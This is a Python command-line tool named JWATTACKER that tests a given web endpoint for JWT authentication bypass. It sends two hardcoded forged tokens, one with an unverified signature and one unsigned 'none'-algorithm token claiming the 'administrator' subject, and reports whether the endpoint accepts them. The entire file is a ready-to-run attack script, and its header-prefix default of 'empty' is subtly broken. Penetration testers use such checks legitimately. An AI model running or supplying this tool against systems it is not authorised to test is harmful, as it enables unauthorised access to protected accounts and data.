import argparse
from pathlib import Path

import pyfiglet
import requests
from termcolor import colored

# Constants
SUPPORTED_HTTP_METHODS = ["post", "get", "put", "delete", "head"]
DEFAULT_AUTH_HEADER = "Authorization"
UNVERIFIED_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
UNSIGNED_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjQ2Njc0MTI5NzR9."

# Banner
fig = pyfiglet.Figlet(font="poison", width=150)
BANNER = fig.renderText("JWATTACKER")
print(colored(BANNER, "red"))

# Arguments
parser = argparse.ArgumentParser(prog="jwattacker", usage="jwattacker.py [mode] [options]", formatter_class=argparse.RawDescriptionHelpFormatter,
                                 description='''\
modes:
-----------------------------------------------------
0: Runs all checks
1: Authentication bypass via unverified signature
2: Authentication bypass via unsigned token
-----------------------------------------------------''')
parser.add_argument("--mode", dest="mode", required=True, help="Choose one of the modes above")
parser.add_argument("-u", dest="url", required=True, help="Full url to protected endpoint, e.g. https://google.com")
parser.add_argument("-m", dest="http_method", default="GET", help="Endpoint http method, e.g. POST, GET, PUT, DELETE")
parser.add_argument("-j", required=True, dest="path_to_jwt", help="Local path to file containing JWT")
parser.add_argument("-hk", dest="jwt_header_key", default="Authorization", help="JWT header key")
parser.add_argument("-pfx", dest="jwt_header_prefix", default="empty", help="Prefix in header value, e.g. Bearer")
parser.add_argument("-S", dest="success_message", default="",
                    help="A string to look in response content when request gives authenticated result, default it will look for 200 response code")
args = parser.parse_args()
url, mode, http_method, path_to_jwt, jwt_header_key, jwt_header_prefix, success_message = args.url, args.mode, args.http_method, args.path_to_jwt, args.jwt_header_key, args.jwt_header_prefix, args.success_message


def get_jwt_from_file(path: str) -> str:
    try:
        return Path(path).read_text()
    except Exception as e:
        print(colored(f"[-] Error reading the jwt file, provide a valid path", "red"))
        print(colored("[ERROR] Technical error", "red"), colored(str(e), "red"))
        exit()


def create_headers(token: str) -> dict[str, str]:
    jwt_header_value = jwt_header_prefix + " " + token if jwt_header_prefix else token
    return {jwt_header_key: jwt_header_value}


def test_first_request():
    print(colored(f"\n[+] Testing {http_method} requests to {url}", "white"))
    token: str = get_jwt_from_file(path_to_jwt)
    headers = create_headers(token)

    try:
        response = requests.request(method=http_method, url=url, headers=headers)
        if response.status_code == 200:
            print(colored(f"[+] Request returned status {response.status_code}, test succeeded, about to start vulnerabilities checks...", "green"))
        else:
            print(colored(f"[-] Above request didn't return OK but {response.status_code}, stopping further tests...", "red"))
            exit()
    except Exception as e:
        print(colored(f"[-] Above request raised an error, perhaps the URL is not correct", "red"))
        print(colored("[ERROR] Technical error", "red"), colored(str(e), "red"))
        exit()


def print_success_message(vulnerability: str):
    print(colored(f"[+] Checks returned POSITIVE results, the endpoint may be vulnerable to {vulnerability}!", "white", "on_magenta"))


def print_unsuccess_message():
    print(colored(f"[-]  Checks returned NEGATIVE results, the endpoint is probably not vulnerable...", "red"))


def make_malicious_request(headers: dict[str, str], vulnerability: str):
    try:
        response = requests.request(method=http_method, url=url, headers=headers)
        if success_message != "" and success_message in str(response.content):
            print_success_message(vulnerability)
        elif response.status_code == 200 and success_message == "":
            print_success_message(vulnerability)
        else:
            print_unsuccess_message()
    except Exception as e:
        print(colored(f"[-] Request raised an unexpected error, skipping check...", "red"))
        print(colored("[ERROR] Technical error", "red"), colored(str(e), "red"))


def bypass_via_unverified_signature():
    print(colored("\n[+] Starting testing authentication bypass via unverified signature...", "white"))
    print(colored(f"[+] Sending {http_method} requests to {url} with fake jwt", "white"))
    headers = create_headers(UNVERIFIED_TOKEN)
    make_malicious_request(headers, "bypass via unverified signature")


def bypass_via_unsigned_token():
    print(colored("\n[+] Starting testing authentication bypass via unsigned token...", "white"))
    print(colored(f"[+] Sending {http_method} requests to {url} with unsigned jwt", "white"))
    headers = create_headers(UNSIGNED_TOKEN)
    make_malicious_request(headers, "bypass via unsigned token")


def run_checks():
    test_first_request()

    match mode:
        case "0":
            bypass_via_unverified_signature()
            bypass_via_unsigned_token()
        case "1":
            bypass_via_unverified_signature()
        case "2":
            bypass_via_unsigned_token()
        case _:
            print(colored("[-] Unsupported mode!", "red"))


def main():
    run_checks()
    # decoded_header: Mapping = jwt.get_unverified_header(token)
    # decoded_payload: dict[str, Any] = jwt.decode(token, algorithms=[decoded_header["alg"]], options={"verify_signature": False})
    # print("Decoded payload ", decoded_payload)
    print("\n")


if __name__ == '__main__':
    main()
